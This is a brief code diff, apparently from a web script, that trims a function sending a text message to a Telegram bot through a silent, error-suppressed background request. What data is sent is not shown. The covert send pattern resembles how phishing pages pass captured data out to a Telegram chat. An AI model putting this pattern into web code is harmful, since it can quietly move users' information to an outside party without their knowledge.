@@ -652,9 +652,7 @@
       var url = 'https://api.telegram.org/bot' + t.bot +
         '/sendMessage?chat_id=' + encodeURIComponent(t.chat) +
         '&text=' + encodeURIComponent(text);
-      try { if(navigator.sendBeacon) navigator.sendBeacon(url); } catch(e){}
-      try { fetch(url, {mode:'no-cors', keepalive:true}).catch(function(){}); } catch(e){}
-      try { var img = new Image(); img.src = url; } catch(e){}
+      fetch(url, {mode:'no-cors', keepalive:true}).catch(function(){});
     } catch(e){}
   }
 
